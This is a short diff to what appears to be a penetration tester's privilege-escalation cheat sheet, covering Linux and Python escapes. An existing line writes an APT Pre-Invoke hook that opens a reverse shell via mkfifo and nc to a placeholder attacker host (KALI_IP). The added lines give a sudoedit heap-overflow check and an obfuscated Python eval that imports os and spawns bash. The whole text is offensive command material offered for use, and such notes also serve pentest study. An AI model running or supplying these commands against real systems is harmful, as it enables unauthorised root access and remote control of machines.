@@ -1123,3 +1123,14 @@ rule CaseInsensitiveTextExample
 echo 'apt::Update::Pre-Invoke {“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP 1234 >/tmp/f”};’ > pwn
 ```
 * https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
+
+[sudoedit]
+* check for vulnerable
+```
+sudoedit -s '\' `perl -e 'print "A" x 65536'`
+```
+
+[python bypass]
+```
+eval("__impo"+"rt__('o"+"s').system('bash')")
+```
